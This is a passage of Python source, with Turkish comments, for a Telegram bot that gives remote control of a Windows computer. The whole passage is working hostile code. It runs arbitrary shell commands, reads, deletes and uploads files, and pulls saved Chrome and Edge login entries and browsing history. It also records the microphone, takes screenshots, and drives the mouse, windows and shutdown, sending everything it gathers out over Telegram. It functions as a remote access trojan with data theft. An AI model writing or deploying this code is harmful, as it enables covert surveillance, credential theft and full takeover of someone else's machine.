            with open("ports.txt", "w", encoding="utf-8") as f:
                f.write(ports_text)
            bot.send_document(message.chat.id, open("ports.txt", 'rb'), caption="🔌 Açık Portlar")
            os.remove("ports.txt")
        else:
            bot.reply_to(message, ports_text)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['usbcihazlar'])
def show_usb_devices(message):
    """USB cihazları gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if platform.system() == "Windows":
            result = subprocess.run(['wmic', 'logicaldisk', 'get', 'name,size,filesystem,volumename'], 
                                  capture_output=True, text=True, encoding='utf-8')
            usb_text = "🔌 USB & DİSK CİHAZLARI\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            usb_text += result.stdout
            bot.reply_to(message, usb_text)
        else:
            bot.reply_to(message, "❌ Bu özellik sadece Windows için!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['servisler'])
def show_services(message):
    """Sistem servislerini gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if platform.system() == "Windows":
            result = subprocess.run(['sc', 'query', 'state=', 'all'], 
                                  capture_output=True, text=True, encoding='utf-8')
            services_text = "⚙️ SİSTEM SERVİSLERİ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            
            if len(result.stdout) > 4000:
                with open("services.txt", "w", encoding="utf-8") as f:
                    f.write(result.stdout)
                bot.send_document(message.chat.id, open("services.txt", 'rb'), caption="⚙️ Sistem Servisleri")
                os.remove("services.txt")
            else:
                services_text += result.stdout[:4000]
                bot.reply_to(message, services_text)
        else:
            bot.reply_to(message, "❌ Bu özellik sadece Windows için!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyasil'])
def delete_file_cmd(message):
    """Dosya siler"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /dosyasil [dosya_yolu]")
            return
        
        file_path = command_text[1].strip()
        
        if not os.path.exists(file_path):
            bot.reply_to(message, f"❌ Dosya bulunamadı: {file_path}")
            return
        
        if os.path.isdir(file_path):
            shutil.rmtree(file_path)
            bot.reply_to(message, f"✅ Klasör silindi: {file_path}")
        else:
            os.remove(file_path)
            bot.reply_to(message, f"✅ Dosya silindi: {file_path}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyaara'])
def search_file(message):
    """Dosya arar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /dosyaara [dosya_ismi]")
            return
        
        search_name = command_text[1].strip()
        bot.reply_to(message, f"🔍 '{search_name}' aranıyor...")
        
        found_files = []
        search_paths = ['C:\\Users', 'C:\\Program Files', 'C:\\Program Files (x86)']
        
        for search_path in search_paths:
            if os.path.exists(search_path):
                for root, dirs, files in os.walk(search_path):
                    if len(found_files) >= 50:  # Maksimum 50 dosya
                        break
                    for file in files:
                        if search_name.lower() in file.lower():
                            found_files.append(os.path.join(root, file))
                    if len(found_files) >= 50:
                        break
                if len(found_files) >= 50:
                    break
        
        if found_files:
            files_text = f"📁 BULUNAN DOSYALAR ({len(found_files)}):\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            files_text += "\n".join(found_files[:30])
            if len(found_files) > 30:
                files_text += f"\n\n... ve {len(found_files) - 30} dosya daha"
            
            if len(files_text) > 4000:
                with open("search_results.txt", "w", encoding="utf-8") as f:
                    f.write(files_text)
                bot.send_document(message.chat.id, open("search_results.txt", 'rb'), caption="🔍 Arama Sonuçları")
                os.remove("search_results.txt")
            else:
                bot.reply_to(message, files_text)
        else:
            bot.reply_to(message, f"❌ '{search_name}' bulunamadı!")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyaoku'])
def read_file_content(message):
    """Dosya içeriğini okur"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /dosyaoku [dosya_yolu]")
            return
        
        file_path = command_text[1].strip()
        
        if not os.path.exists(file_path):
            bot.reply_to(message, f"❌ Dosya bulunamadı: {file_path}")
            return
        
        if not os.path.isfile(file_path):
            bot.reply_to(message, f"❌ Bu bir dosya değil: {file_path}")
            return
        
        # Dosya boyutu kontrolü
        file_size = os.path.getsize(file_path)
        if file_size > 5 * 1024 * 1024:  # 5MB
            bot.reply_to(message, "❌ Dosya çok büyük! (5MB limit)")
            return
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
        except:
            with open(file_path, 'r', encoding='latin-1') as f:
                content = f.read()
        
        if len(content) > 4000:
            with open("file_content.txt", "w", encoding="utf-8") as f:
                f.write(content)
            bot.send_document(message.chat.id, open("file_content.txt", 'rb'), caption=f"📄 {os.path.basename(file_path)}")
            os.remove("file_content.txt")
        else:
            bot.reply_to(message, f"📄 {os.path.basename(file_path)}:\n\n```\n{content}\n```", parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['sifreler'])
def get_passwords(message):
    """Kayıtlı şifreleri gösterir (Chrome/Edge)"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        passwords_text = "🔑 KAYITLI ŞİFRELER\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        passwords_found = False
        
        # Chrome
        chrome_paths = [
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data")
        ]
        
        # Edge
        edge_paths = [
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data")
        ]
        
        all_paths = chrome_paths + edge_paths
        
        for db_path in all_paths:
            if os.path.exists(db_path):
                try:
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cursor.fetchall()
                    
                    if rows:
                        passwords_found = True
                        browser = "Chrome" if "Chrome" in db_path else "Edge"
                        passwords_text += f"🌐 {browser}:\n\n"
                        
                        for row in rows[:20]:  # İlk 20
                            url, username, password = row
                            # Şifreler şifrelenmiş, bu yüzden sadece URL ve kullanıcı adı gösteriyoruz
                            passwords_text += f"🔹 {url}\n   👤 {username}\n\n"
                        
                        conn.close()
                except:
                    pass
        
        if not passwords_found:
            passwords_text += "❌ Kayıtlı şifre bulunamadı veya erişilemiyor."
        
        if len(passwords_text) > 4000:
            with open("passwords.txt", "w", encoding="utf-8") as f:
                f.write(passwords_text)
            bot.send_document(message.chat.id, open("passwords.txt", 'rb'), caption="🔑 Kayıtlı Şifreler")
            os.remove("passwords.txt")
        else:
            bot.reply_to(message, passwords_text)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['gecmis'])
def get_history(message):
    """Tarayıcı geçmişini gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        history_text = "🌐 TARAYICI GEÇMİŞİ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        history_found = False
        
        # Chrome geçmişi
        chrome_history = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        
        if os.path.exists(chrome_history):
            try:
                # Geçmiş dosyasını kopyala (çünkü kilitli olabilir)
                temp_history = "temp_history.db"
                shutil.copy2(chrome_history, temp_history)
                
                conn = sqlite3.connect(temp_history)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 50")
                rows = cursor.fetchall()
                
                if rows:
                    history_found = True
                    history_text += "🌐 Chrome:\n\n"
                    for row in rows:
                        url, title, count, last_visit = row
                        history_text += f"🔹 {title or url}\n   📊 {count} ziyaret\n   🔗 {url}\n\n"
                
                conn.close()
                if os.path.exists(temp_history):
                    os.remove(temp_history)
            except:
                pass
        
        if not history_found:
            history_text += "❌ Geçmiş bulunamadı veya erişilemiyor."
        
        if len(history_text) > 4000:
            with open("history.txt", "w", encoding="utf-8") as f:
                f.write(history_text)
            bot.send_document(message.chat.id, open("history.txt", 'rb'), caption="🌐 Tarayıcı Geçmişi")
            os.remove("history.txt")
        else:
            bot.reply_to(message, history_text)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['webekran'])
def website_screenshot(message):
    """Web sitesi ekran görüntüsü alır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /webekran [url]")
            return
        
        url = command_text[1].strip()
        if not url.startswith('http'):
            url = 'https://' + url
        
        bot.reply_to(message, f"🌐 Web sitesi açılıyor: {url}")
        
        # Tarayıcıyı aç
        webbrowser.open(url)
        time.sleep(3)  # Sayfanın yüklenmesi için bekle
        
        # Ekran görüntüsü al
        screenshot = pyautogui.screenshot()
        screenshot_path = "temp_web_screenshot.png"
        screenshot.save(screenshot_path)
        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=f"🌐 {url}")
        
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['farehareket'])
def move_mouse(message):
    """Fareyi hareket ettirir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ')
        if len(command_text) < 3:
            bot.reply_to(message, "❓ Kullanım: /farehareket [x] [y]")
            return
        
        x = int(command_text[1])
        y = int(command_text[2])
        
        pyautogui.moveTo(x, y, duration=0.5)
        bot.reply_to(message, f"✅ Fare ({x}, {y}) konumuna taşındı!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['faretikla'])
def click_mouse(message):
    """Fare tıklaması yapar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        button = command_text[1].lower() if len(command_text) > 1 else "sol"
        
        if "sol" in button or "left" in button:
            pyautogui.click(button='left')
            bot.reply_to(message, "✅ Sol tık yapıldı!")
        elif "sag" in button or "right" in button or "sağ" in button:
            pyautogui.click(button='right')
            bot.reply_to(message, "✅ Sağ tık yapıldı!")
        elif "orta" in button or "middle" in button:
            pyautogui.click(button='middle')
            bot.reply_to(message, "✅ Orta tık yapıldı!")
        else:
            bot.reply_to(message, "❓ Kullanım: /faretikla [sol/sag/orta]")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['ekrankilitle'])
def lock_screen(message):
    """Ekranı kilitler"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.LockWorkStation()
            bot.reply_to(message, "🔒 Ekran kilitlendi!")
        else:
            bot.reply_to(message, "❌ Bu özellik sadece Windows için!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['komutcalistir'])
def run_command(message):
    """Komut çalıştırır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /komutcalistir [komut]")
            return
        
        cmd = command_text[1]
        bot.reply_to(message, f"⚙️ Komut çalıştırılıyor: {cmd}")
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', timeout=30)
        
        output = result.stdout + result.stderr
        if not output:
            output = "Komut başarıyla çalıştırıldı (çıktı yok)."
        
        if len(output) > 4000:
            with open("command_output.txt", "w", encoding="utf-8") as f:
                f.write(output)
            bot.send_document(message.chat.id, open("command_output.txt", 'rb'), caption="⚙️ Komut Çıktısı")
            os.remove("command_output.txt")
        else:
            bot.reply_to(message, f"⚙️ Çıktı:\n\n```\n{output}\n```", parse_mode='Markdown')
            
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "⏱️ Komut zaman aşımına uğradı (30 saniye)")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['kapat'])
def shutdown_computer(message):
    """Bilgisayarı kapatır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "⚠️ Bilgisayar 10 saniye içinde kapatılacak!")
        if platform.system() == "Windows":
            subprocess.run(['shutdown', '/s', '/t', '10'], shell=True)
        else:
            subprocess.run(['shutdown', '-h', '+1'], shell=True)
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['yenidenbaslat'])
def restart_computer(message):
    """Bilgisayarı yeniden başlatır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "⚠️ Bilgisayar 10 saniye içinde yeniden başlatılacak!")
        if platform.system() == "Windows":
            subprocess.run(['shutdown', '/r', '/t', '10'], shell=True)
        else:
            subprocess.run(['shutdown', '-r', '+1'], shell=True)
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['mikrofon'])
def record_microphone(message):
    """Mikrofon kaydı yapar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "🎤 5 saniye mikrofon kaydı başlıyor...")
        
        if platform.system() == "Windows":
            # Windows için ses kaydı
            import sounddevice as sd
            import soundfile as sf
            
            duration = 5
            sample_rate = 44100
            
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
            sd.wait()
            
            audio_path = "temp_microphone.wav"
            sf.write(audio_path, recording, sample_rate)
            
            with open(audio_path, 'rb') as audio:
                bot.send_audio(message.chat.id, audio, caption="🎤 Mikrofon kaydı")
            
            if os.path.exists(audio_path):
                os.remove(audio_path)
        else:
            bot.reply_to(message, "❌ Bu özellik şu an sadece Windows için!")
            
    except ImportError:
        bot.reply_to(message, "❌ Ses kaydı için 'sounddevice' ve 'soundfile' kütüphaneleri gerekli!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['ekranparlaklik'])
def screen_brightness(message):
    """Ekran parlaklığını gösterir/ayarlar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) > 1:
            # Parlaklık ayarla
            brightness = int(command_text[1])
            if 0 <= brightness <= 100:
                if platform.system() == "Windows":
                    subprocess.run(['powershell', f'(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{brightness})'], shell=True)
                    bot.reply_to(message, f"✅ Ekran parlaklığı {brightness}% olarak ayarlandı!")
                else:
                    bot.reply_to(message, "❌ Bu özellik sadece Windows için!")
            else:
                bot.reply_to(message, "❌ Parlaklık 0-100 arası olmalı!")
        else:
            # Mevcut parlaklığı göster
            bot.reply_to(message, "💡 Kullanım: /ekranparlaklik [0-100]\nÖrnek: /ekranparlaklik 50")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['sesduzeyi'])
def volume_control(message):
    """Ses seviyesini gösterir/ayarlar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) > 1:
            # Ses seviyesi ayarla
            volume = int(command_text[1])
            if 0 <= volume <= 100:
                if platform.system() == "Windows":
                    subprocess.run(['powershell', f'(New-Object -ComObject Shell.Application).NameSpace(17).ParseName("").InvokeVerb("properties"); [System.Windows.Forms.SendKeys]::SendWait("{{}}")'], shell=True)
                    # Alternatif yöntem
                    subprocess.run(['nircmd', 'setsysvolume', str(volume * 655)], shell=True)
                    bot.reply_to(message, f"🔊 Ses seviyesi {volume}% olarak ayarlandı!")
                else:
                    bot.reply_to(message, "❌ Bu özellik sadece Windows için!")
            else:
                bot.reply_to(message, "❌ Ses seviyesi 0-100 arası olmalı!")
        else:
            # Mevcut ses seviyesini göster
            if platform.system() == "Windows":
                result = subprocess.run(['powershell', 'Get-AudioDevice | Select-Object -ExpandProperty Volume'], 
                                      capture_output=True, text=True, shell=True)
                bot.reply_to(message, f"🔊 Mevcut ses seviyesi: {result.stdout.strip()}\n\nKullanım: /sesduzeyi [0-100]")
            else:
                bot.reply_to(message, "💡 Kullanım: /sesduzeyi [0-100]")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['tarayicikayit'])
def browser_screenshot(message):
    """Aktif tarayıcı penceresinin ekran görüntüsünü alır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        bot.reply_to(message, "🌐 Tarayıcı ekran görüntüsü alınıyor...")
        
        # Ekran görüntüsü al
        screenshot = pyautogui.screenshot()
        screenshot_path = "temp_browser.png"
        screenshot.save(screenshot_path)
        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption="🌐 Tarayıcı Ekran Görüntüsü")
        
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyayukle'])
def upload_file_to_pc(message):
    """Telegram'dan dosya yükler (dosya gönderildiğinde)"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            file_name = message.document.file_name
            save_path = os.path.join(os.getcwd(), file_name)
            
            with open(save_path, 'wb') as f:
                f.write(downloaded_file)
            
            bot.reply_to(message, f"✅ Dosya kaydedildi: {save_path}")
        else:
            bot.reply_to(message, "❓ Lütfen bir dosya gönderin!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Gönderilen dosyaları işler"""
    upload_file_to_pc(message)

@bot.message_handler(commands=['agbilgisi'])
def network_info(message):
    """Ağ bağlantı bilgilerini gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        net_io = psutil.net_io_counters()
        net_if_addrs = psutil.net_if_addrs()
        
        network_text = "🌐 AĞ BİLGİLERİ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        network_text += f"📊 Toplam Gönderilen: {net_io.bytes_sent / 1024 / 1024 / 1024:.2f} GB\n"
        network_text += f"📊 Toplam Alınan: {net_io.bytes_recv / 1024 / 1024 / 1024:.2f} GB\n"
        network_text += f"📦 Paket Gönderilen: {net_io.packets_sent}\n"
        network_text += f"📦 Paket Alınan: {net_io.packets_recv}\n\n"
        
        network_text += "🔌 Ağ Arayüzleri:\n"
        for interface, addrs in list(net_if_addrs.items())[:10]:
            network_text += f"  📡 {interface}\n"
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_text += f"    IPv4: {addr.address}\n"
                elif addr.family == socket.AF_INET6:
                    network_text += f"    IPv6: {addr.address}\n"
            network_text += "\n"
        
        if len(network_text) > 4000:
            with open("network_info.txt", "w", encoding="utf-8") as f:
                f.write(network_text)
            bot.send_document(message.chat.id, open("network_info.txt", 'rb'), caption="🌐 Ağ Bilgileri")
            os.remove("network_info.txt")
        else:
            bot.reply_to(message, network_text)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['pencerebilgi'])
def window_info(message):
    """Aktif pencere bilgilerini gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        import pygetwindow as gw
        
        windows = gw.getActiveWindow()
        if windows:
            window_text = f"""
🪟 AKTİF PENCERE BİLGİLERİ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📝 Başlık: {windows.title}
📍 Konum: ({windows.left}, {windows.top})
📐 Boyut: {windows.width}x{windows.height}
            """
            bot.reply_to(message, window_text)
        else:
            bot.reply_to(message, "❌ Aktif pencere bulunamadı!")
    except ImportError:
        bot.reply_to(message, "❌ 'pygetwindow' kütüphanesi gerekli!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['tumpencereler'])
def all_windows(message):
    """Tüm açık pencereleri listeler"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        import pygetwindow as gw
        
        windows = gw.getAllWindows()
        windows_text = "🪟 AÇIK PENCERELER\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for i, win in enumerate(windows[:30], 1):
            if win.title:
                windows_text += f"{i}. {win.title}\n"
        
        if len(windows_text) > 4000:
            with open("windows.txt", "w", encoding="utf-8") as f:
                f.write(windows_text)
            bot.send_document(message.chat.id, open("windows.txt", 'rb'), caption="🪟 Açık Pencereler")
            os.remove("windows.txt")
        else:
            bot.reply_to(message, windows_text)
    except ImportError:
        bot.reply_to(message, "❌ 'pygetwindow' kütüphanesi gerekli!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['pencerekapat'])
def close_window(message):
    """Aktif pencereyi kapatır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        import pygetwindow as gw
        window = gw.getActiveWindow()
        if window:
            window.close()
            bot.reply_to(message, f"✅ Pencere kapatıldı: {window.title}")
        else:
            bot.reply_to(message, "❌ Aktif pencere bulunamadı!")
    except ImportError:
        bot.reply_to(message, "❌ 'pygetwindow' kütüphanesi gerekli!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['pencerebuyut'])
def maximize_window(message):
    """Aktif pencereyi büyütür"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        import pygetwindow as gw
        window = gw.getActiveWindow()
        if window:
            window.maximize()
            bot.reply_to(message, f"✅ Pencere büyütüldü: {window.title}")
        else:
            bot.reply_to(message, "❌ Aktif pencere bulunamadı!")
    except ImportError:
        bot.reply_to(message, "❌ 'pygetwindow' kütüphanesi gerekli!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['pencerekucult'])
def minimize_window(message):
    """Aktif pencereyi küçültür"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        import pygetwindow as gw
        window = gw.getActiveWindow()
        if window:
            window.minimize()
            bot.reply_to(message, f"✅ Pencere küçültüldü: {window.title}")
        else:
            bot.reply_to(message, "❌ Aktif pencere bulunamadı!")
    except ImportError:
        bot.reply_to(message, "❌ 'pygetwindow' kütüphanesi gerekli!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['pencereaktif'])
def activate_window(message):
    """Pencereyi aktif hale getirir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /pencereaktif [pencere_ismi]")
            return
        
        window_name = command_text[1]
        import pygetwindow as gw
        
        windows = gw.getWindowsWithTitle(window_name)
        if windows:
            windows[0].activate()
            bot.reply_to(message, f"✅ Pencere aktif hale getirildi: {window_name}")
        else:
            bot.reply_to(message, f"❌ Pencere bulunamadı: {window_name}")
    except ImportError:
        bot.reply_to(message, "❌ 'pygetwindow' kütüphanesi gerekli!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyayenidenadlandir'])
def rename_file(message):
    """Dosyayı yeniden adlandırır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 2)
        if len(command_text) < 3:
            bot.reply_to(message, "❓ Kullanım: /dosyayenidenadlandir [eski_isim] [yeni_isim]")
            return
        
        old_name = command_text[1]
        new_name = command_text[2]
        
        if os.path.exists(old_name):
            os.rename(old_name, new_name)
            bot.reply_to(message, f"✅ Dosya yeniden adlandırıldı:\n{old_name} → {new_name}")
        else:
            bot.reply_to(message, f"❌ Dosya bulunamadı: {old_name}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyakopyala'])
def copy_file(message):
    """Dosyayı kopyalar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 2)
        if len(command_text) < 3:
            bot.reply_to(message, "❓ Kullanım: /dosyakopyala [kaynak] [hedef]")
            return
        
        source = command_text[1]
        destination = command_text[2]
        
        if os.path.exists(source):
            shutil.copy2(source, destination)
            bot.reply_to(message, f"✅ Dosya kopyalandı:\n{source} → {destination}")
        else:
            bot.reply_to(message, f"❌ Dosya bulunamadı: {source}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyatasima'])
def move_file(message):
    """Dosyayı taşır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 2)
        if len(command_text) < 3:
            bot.reply_to(message, "❓ Kullanım: /dosyatasima [kaynak] [hedef]")
            return
        
        source = command_text[1]
        destination = command_text[2]
        
        if os.path.exists(source):
            shutil.move(source, destination)
            bot.reply_to(message, f"✅ Dosya taşındı:\n{source} → {destination}")
        else:
            bot.reply_to(message, f"❌ Dosya bulunamadı: {source}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['klasorolustur'])
def create_folder(message):
    """Klasör oluşturur"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /klasorolustur [klasor_yolu]")
            return
        
        folder_path = command_text[1]
        
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            bot.reply_to(message, f"✅ Klasör oluşturuldu: {folder_path}")
        else:
            bot.reply_to(message, f"⚠️ Klasör zaten mevcut: {folder_path}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['dosyaboyutu'])
def file_size(message):
    """Dosya boyutunu gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /dosyaboyutu [dosya_yolu]")
            return
        
        file_path = command_text[1]
        
        if os.path.exists(file_path):
            size = os.path.getsize(file_path)
            size_kb = size / 1024
            size_mb = size / 1024 / 1024
            size_gb = size / 1024 / 1024 / 1024
            
            size_text = f"""
📊 DOSYA BOYUTU
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📁 Dosya: {file_path}
💾 Byte: {size:,}
📦 KB: {size_kb:.2f}
💿 MB: {size_mb:.2f}
💽 GB: {size_gb:.2f}
            """
            bot.reply_to(message, size_text)
        else:
            bot.reply_to(message, f"❌ Dosya bulunamadı: {file_path}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['sistemzaman'])
def system_time(message):
    """Sistem zamanını gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        now = datetime.datetime.now()
        time_text = f"""
🕐 SİSTEM ZAMANI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📅 Tarih: {now.strftime('%d/%m/%Y')}
⏰ Saat: {now.strftime('%H:%M:%S')}
📆 Tam: {now.strftime('%d/%m/%Y %H:%M:%S')}
🌍 Zaman Dilimi: {time.tzname[0] if time.tzname else 'Bilinmiyor'}
        """
        bot.reply_to(message, time_text)
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

